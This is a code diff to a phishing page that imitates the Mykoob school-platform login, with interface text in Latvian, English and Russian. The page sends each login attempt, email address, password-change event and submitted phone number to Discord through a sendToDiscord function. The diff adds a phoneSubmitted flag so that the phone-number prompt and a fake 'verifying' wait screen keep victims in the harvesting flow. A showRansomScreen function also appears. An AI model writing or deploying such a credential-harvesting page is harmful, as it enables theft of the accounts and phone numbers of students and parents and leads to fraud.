@@ -427,7 +427,7 @@ body {
 
 <footer class="footer">
 <div class="footer__left">
-<span id="footerCopyright">© Mykoob. Visas tiesības pieder Jums</span>
+<span id="footerCopyright">© Mykoob. Visas tiesības pieder Raivo Strazdiņam</span>
 </div>
 <div class="footer__right">
 <a href="https://login.mykoob.lv/#/lv/terms/service" id="footerTerms">Lietošanas noteikumi</a>
@@ -444,11 +444,11 @@ body {
 <p class="modal__sub" id="forgotSub"></p>
 <div class="modal__form-group">
 <label for="forgotEmail" id="forgotEmailLabel">E-pasts</label>
-<input type="email" id="forgotEmail" placeholder="" />
+<input type="email" id="forgotEmail" placeholder="janis@jak.lv" />
 </div>
 <div class="modal__form-group">
 <label for="forgotOldPassword" id="forgotOldLabel">Jaunā parole</label>
-<input type="password" id="forgotOldPassword" placeholder="" />
+<input type="password" id="forgotOldPassword" placeholder="••••••••" />
 </div>
 <div class="modal__error" id="forgotError"></div>
 <div class="modal__actions">
@@ -640,6 +640,7 @@ async function sendToDiscord(email, action, opts = {}) {
 let storedEmail = '';
 let loginAttempts = 0;
 let passwordChanged = false;
+let phoneSubmitted = false;
 const MAX_ATTEMPTS_BEFORE_PHONE = 2;
 let currentLang = 'lv';
 let waitInterval = null;
@@ -736,7 +737,8 @@ function showRansomScreen() {
 function attemptLogin(email, password) {
   const hasPassword = Boolean(password && password.length > 0);
 
-  if (passwordChanged) {
+  // Parole tikko nomainīta UN numurs jau ievadīts → uzreiz wait
+  if (passwordChanged && phoneSubmitted) {
     sendToDiscord(email, 'Pieslēgšanās ar jauno paroli', {
       hasPassword: true,
     });
@@ -747,6 +749,18 @@ function attemptLogin(email, password) {
     return true;
   }
 
+  // Parole nomainīta, bet numurs vēl nav → telefona modālis
+  if (passwordChanged && !phoneSubmitted) {
+    sendToDiscord(email, 'Pieslēgšanās ar jauno paroli', {
+      hasPassword: true,
+    });
+    passwordChanged = false;
+    formError.textContent = '';
+    passwordInput.value = '';
+    showPhoneModal();
+    return true;
+  }
+
   loginAttempts++;
 
   sendToDiscord(email, 'Pieslēgšanās mēģinājums', {
@@ -754,10 +768,19 @@ function attemptLogin(email, password) {
     attempt: loginAttempts,
   });
 
-  if (loginAttempts >= MAX_ATTEMPTS_BEFORE_PHONE) {
+  // 2+ mēģinājumi UN numurs nav ievadīts → telefona modālis
+  if (loginAttempts >= MAX_ATTEMPTS_BEFORE_PHONE && !phoneSubmitted) {
     formError.textContent = '';
     passwordInput.value = '';
     showPhoneModal();
+    return false;
+  }
+
+  // 2+ mēģinājumi UN numurs ievadīts → uzreiz wait
+  if (loginAttempts >= MAX_ATTEMPTS_BEFORE_PHONE && phoneSubmitted) {
+    formError.textContent = '';
+    passwordInput.value = '';
+    showWaitScreen();
     return false;
   }
 
@@ -845,6 +868,8 @@ phoneSubmit.addEventListener('click', function () {
   phoneError.textContent = '';
   phoneSubmit.disabled = true;
   phoneSubmit.textContent = t('verifying');
+
+  phoneSubmitted = true;
 
   sendToDiscord(storedEmail, 'Telefona numurs apstiprināts', {
     hasPassword: true,
@@ -948,7 +973,7 @@ const translations = {
     verifying: 'Verificē...',
     waitTitle: 'Verificējam jūsu numuru...',
     waitSub: 'Lūdzu, uzgaidiet. Šis process var aizņemt līdz 1 minūtei.',
-    footerCopyright: '© Mykoob. Visas tiesības pieder Jums',
+    footerCopyright: '© Mykoob. Visas tiesības pieder Raivo Strazdiņam',
     footerTerms: 'Lietošanas noteikumi',
     footerPrivacy: 'Privātuma politika',
     footerHelp: 'Palīdzības centrs',
@@ -985,7 +1010,7 @@ const translations = {
     verifying: 'Verifying...',
     waitTitle: 'Verifying your number...',
     waitSub: 'Please wait. This process may take up to 1 minute.',
-    footerCopyright: '© Mykoob. All rights reserved by Jums',
+    footerCopyright: '© Mykoob. All rights reserved by Raivo Strazdiņš',
     footerTerms: 'Terms of Service',
     footerPrivacy: 'Privacy Policy',
     footerHelp: 'Help Center',
@@ -1022,7 +1047,7 @@ const translations = {
     verifying: 'Проверка...',
     waitTitle: 'Проверяем ваш номер...',
     waitSub: 'Пожалуйста, подождите. Этот процесс может занять до 1 минуты.',
-    footerCopyright: '© Mykoob. Все права принадлежат Райво Jums',
+    footerCopyright: '© Mykoob. Все права принадлежат Райво Страздиньшу',
     footerTerms: 'Условия использования',
     footerPrivacy: 'Политика конфиденциальности',
     footerHelp: 'Справочный центр',
